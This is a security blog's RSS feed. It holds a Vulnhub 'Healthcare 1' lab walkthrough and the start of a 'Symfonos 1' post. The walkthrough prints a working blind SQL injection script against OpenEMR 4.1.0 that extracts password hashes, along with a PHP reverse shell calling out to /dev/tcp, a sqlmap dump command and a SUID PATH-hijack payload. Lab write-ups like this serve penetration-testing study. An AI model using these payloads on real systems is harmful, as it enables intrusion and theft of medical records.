<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SUID on</title><link>https://blog.ikuamike.io/tags/suid/</link><description>Recent content in SUID on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 03 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/suid/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub: Healthcare 1</title><link>https://blog.ikuamike.io/posts/2021/healthcare1/</link><pubDate>Sat, 03 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/healthcare1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Difficulty&lt;/th>
&lt;th>Release Date&lt;/th>
&lt;th>Author&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Intermediate&lt;/td>
&lt;td>29 Jul 2020&lt;/td>
&lt;td>v1n1v131r4&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>For this box, we perform directory bruteforce on the webserver to discover a vulnerable version of openemr. Openemr here
is vulnerable to sql injection that we leverage to extract usernames and password hashes. After cracking the hashes, we use the
discovered credentials to access the ftp server and upload a php reverse shell to the webserver. This serves as our initial
entry. To escalate our privileges we abuse a suid binary that doesn&amp;rsquo;t use absolute path in commands it&amp;rsquo;s running,
therefore we can hijack any of those commands and run any commands of our choosing as root.&lt;/p>
&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
&lt;p>Nmap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.106
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00023s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>21/tcp open ftp ProFTPD 1.3.3d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.2.17 &lt;span style="color:#f92672">((&lt;/span>PCLinuxOS 2011/PREFORK-1pclos2011&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-robots.txt: &lt;span style="color:#ae81ff">8&lt;/span> disallowed entries
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_/all_our_e-mail_addresses /admin/ /
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.2.17 &lt;span style="color:#f92672">(&lt;/span>PCLinuxOS 2011/PREFORK-1pclos2011&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Coming Soon &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Unix
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;h2 id="21-ftp">21 (FTP)&lt;/h2>
&lt;p>Anonymous access is not enabled and the server version isn&amp;rsquo;t vulnerable to any known vulnerabilities.
We can look at this again when we have credentials.&lt;/p>
&lt;h2 id="80-http">80 (HTTP)&lt;/h2>
&lt;p>Accessing this on the browser, we only get a static site with not much functionality.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>When we perform a directory bruteforce we get the following results:&lt;/p>
&lt;pre tabindex="0">&lt;code>ffuf -ic -c -u &amp;#39;http://192.168.56.106/FUZZ&amp;#39; -e / -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -fc 403 | tee -a healthcare1.ffuf
&lt;/code>&lt;/pre>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>After checking the directories we have discovered, openemr returns an application. From their website:&lt;/p>
&lt;blockquote>
&lt;p>OpenEMR is the most popular open source electronic health records and medical practice management solution.&lt;/p>
&lt;/blockquote>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>This version of openemr is outdated. Searching for available vulnerabilities and exploits for this version using searchsploit,
we discover an sql injection vulnerability.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Unfortunately the PoC provided doesn&amp;rsquo;t work. I found a better one from packetstormsecurity:&lt;/p>
&lt;pre tabindex="0">&lt;code>https://packetstormsecurity.com/files/108328/OpenEMR-4.1.0-SQL-Injection.html
&lt;/code>&lt;/pre>&lt;p>The PoC provided shows a blind sql injection. The below payload causes the request to delay for about 5 seconds.&lt;/p>
&lt;pre tabindex="0">&lt;code>http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#39;%2b(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2b&amp;#39;
&lt;/code>&lt;/pre>&lt;p>Using this, I was able to create a script to extract username and password hash of all existing users. Soon to be
submitted to exploit-db.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Exploit Title: OpenEMR 4.1.0 - SQL Injection&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Date: 2021-04-03&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Exploit Author: Michael Ikua&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Vendor Homepage: https://www.open-emr.org/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Version: 4.1.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> string
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> sys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ____ ________ _______ __ __ ___ ____
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> / __ \____ ___ ____ / ____/ |/ / __ \ / // / &amp;lt; // __ &lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ / / // /_ / // / / /
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">/ /_/ / /_/ / __/ / / / /___/ / / / _, _/ /__ __/ / // /_/ /
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">\____/ .___/\___/_/ /_/_____/_/ /_/_/ |_| /_/ (_)_(_)____/
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> /_/
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ____ ___ __ _____ ____ __ _
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> / __ )/ (_)___ ____/ / / ___// __ \ / / (_)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> / /_/ / / / __ \/ __ / \__ \/ / / / / / / /
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> / /_/ / / / / / / /_/ / ___/ / /_/ / / /___/ /
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">/_____/_/_/_/ /_/\__,_/ /____/\___\_\/_____/_/ exploit by @ikuamike
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>all &lt;span style="color:#f92672">=&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># edit url to point to your openemr instance&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">extract_users_num&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;[+] Finding number of users...&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> n &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">100&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%2b(SELECT+if((select count(username) from users)=&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(n) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;,sleep(3),1))%2b&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">+&lt;/span>payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>elapsed&lt;span style="color:#f92672">.&lt;/span>total_seconds() &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_length &lt;span style="color:#f92672">=&lt;/span> n
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;[+] Found number of users: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(user_length))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> user_length
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">extract_users&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> users &lt;span style="color:#f92672">=&lt;/span> extract_users_num()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;[+] Extracting username and password hash...&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> n &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">1000&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%2b(SELECT+if(length((select+group_concat(username,&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">,password)+from+users+limit+0,1))=&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(n) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;,sleep(3),1))%2b&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#print(payload)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">+&lt;/span>payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#print(r.request.url)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>elapsed&lt;span style="color:#f92672">.&lt;/span>total_seconds() &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> length &lt;span style="color:#f92672">=&lt;/span> n
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,length&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> char &lt;span style="color:#f92672">in&lt;/span> all:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%2b(SELECT+if(ascii(substr((select+group_concat(username,&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">,password)+from+users+limit+0,1),&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span> str(i)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#39;,1))=&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>str(ord(char))&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#39;,sleep(3),1))%2b&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#print(payload)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">+&lt;/span>payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#print(r.request.url)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>elapsed&lt;span style="color:#f92672">.&lt;/span>total_seconds() &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output&lt;span style="color:#f92672">.&lt;/span>append(char)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> char &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;,&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(char, end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, flush&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> extract_users()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;[+] Exiting...&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sys&lt;span style="color:#f92672">.&lt;/span>exit()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After running the script, we get the hashes of 2 users.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;pre tabindex="0">&lt;code>admin : 3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical : ab24aed5a7c4ad45615cd7e0da816eea39e4895d
&lt;/code>&lt;/pre>&lt;p>We can try crack these hashes using hashcat/john the ripper but using crackstation.net would be quicker.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Now we have passwords for both users.&lt;/p>
&lt;pre tabindex="0">&lt;code>admin : ackbar
medical : medical
&lt;/code>&lt;/pre>&lt;h1 id="shell-as-apache">Shell as apache&lt;/h1>
&lt;p>With this credentials, let&amp;rsquo;s get back to ftp. Only the credentials for medical user work.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>On ftp we see that we have access to the file system as the medical user, and we can even access
the web server directory.&lt;/p>
&lt;p>Due to the permissions set we can only write to openemr directory. With this, we can upload a php file that will provide
a reverse shell.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Contents of revshell.php:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#a6e22e">system&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span>); &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Making a request to the uploaded file using curl, we get the reverse shell.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-9.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>After spawning a proper tty shell with python, we can switch to the medical user. In the Documents folder there&amp;rsquo;s a
Passwords.txt but the root creds don&amp;rsquo;t work.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
&lt;p>Checking for usual privesc techniques like suid binaries by using find command we get one unusual binary.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>find / -perm -4000 -ls 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>After running healthcheck, it outputs some system information like disks.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>To understand what exactly it&amp;rsquo;s doing, we run strings on this binary. From this we identify ways to abuse this since
it doesn&amp;rsquo;t use absolute paths on the commands it runs, therefore it will use what it finds from our PATH variable.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>I&amp;rsquo;ll use ifconfig here with my own code and place it in the /tmp folder and update my PATH variable. When this ifconfig
is executed it will created a copy of the bash binary which has suid permissions.&lt;/p>
&lt;p>Contents of ifconfig:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/sh
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>cp /bin/bash /tmp/suidbash;chmod u+s /tmp/suidbash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-14.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>We can then run the suidbash binary with -p to preserve the privileges and get root privileges and read the final
root.txt.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-15.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>After getting root I found I has skipped over user.txt in almirant&amp;rsquo;s home directory&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-16.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h1 id="extras">Extras&lt;/h1>
&lt;p>After looking at other writeups, I discovered other possible paths for exploiting this
machine.&lt;/p>
&lt;p>Initial step needed was exploiting the sql injection. Using sqlmap would have been a quicker way
and achieved the same results. I intentionally didn&amp;rsquo;t use sqlmap on my initial exploitation.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sqlmap -u &lt;span style="color:#e6db74">&amp;#34;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#34;&lt;/span> --batch --dump -T users -C username,password
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-25.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Using the obtained credentials, we can login to openemr as administrator and we can either upload a php file or
edit existing php files for command execution.&lt;/p>
&lt;ul>
&lt;li>
&lt;h4 id="file-upload">File upload&lt;/h4>
&lt;/li>
&lt;/ul>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-17.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>The file upload functionality does not have restrictions, therefore we can upload our php reverse shell and it will
be stored in that images directory.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-18.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>We can the trigger the reverse shell by visiting the revshell.php in the /openemr/sites/default/images/ directory.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-19.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Reverse shell obtained.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-20.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;ul>
&lt;li>
&lt;h4 id="edit-existing-php-files">Edit existing php files&lt;/h4>
&lt;/li>
&lt;/ul>
&lt;p>Using the same files functionality, we can also perform edits to existing files. In this case we can edit config.php
and add our reverse shell payload. After saving it and refreshing the page, a reverse shell is obtained on netcat
listener.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-24.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Another possible path that would have been taken after initial shell was that, the shadow file in the
/var/backups directory was world readable.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-21.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Therefore we can crack this hash and switch user to almirant.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-22.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Then we get user.txt.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-23.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item><item><title>Vulnhub: Symfonos 1</title><link>https://blog.ikuamike.io/posts/2021/symfonos1/</link><pubDate>Fri, 22 Jan 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Difficulty&lt;/th>
&lt;th>Release Date&lt;/th>
&lt;th>Author&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Beginner&lt;/td>
&lt;td>29 June 2019&lt;/td>
&lt;td>Zayotic&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>I got an OSCP voucher last year and this is my active effort to prep for it using TJ-Null&amp;rsquo;s OSCP
Prep list. Hopefully documenting this will help improve my methodology and get me ready for OSCP and beyond.&lt;/p>
&lt;p>In this box, initial access is through lfi to rce by using sending a payload in mail and accessing it.For privilege
escalation we exploit a setuid binary that doesn&amp;rsquo;t use absolute paths, therefore hijacking the path gives us root.&lt;/p>
&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
&lt;p>I already have the IP of the box.&lt;/p>
&lt;p>Nmap output:&lt;/p>
